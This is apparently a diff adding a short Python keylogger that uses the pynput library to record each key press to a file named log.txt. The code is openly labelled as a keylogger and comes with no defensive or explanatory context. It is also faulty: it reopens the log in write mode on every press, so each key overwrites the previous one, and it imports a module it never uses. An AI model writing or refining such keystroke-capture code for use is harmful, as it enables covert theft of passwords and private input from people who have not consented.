@@ -1,0 +1,11 @@
+from pynput.keyboard import Listener
+import time
+
+
+def keylogger(key):
+    key_data = str(key).replace("'", "")
+    with open("log.txt", "w") as file:
+        file.write(key_data + "\n")
+
+with Listener(on_press=keylogger) as listener:
+    listener.join()
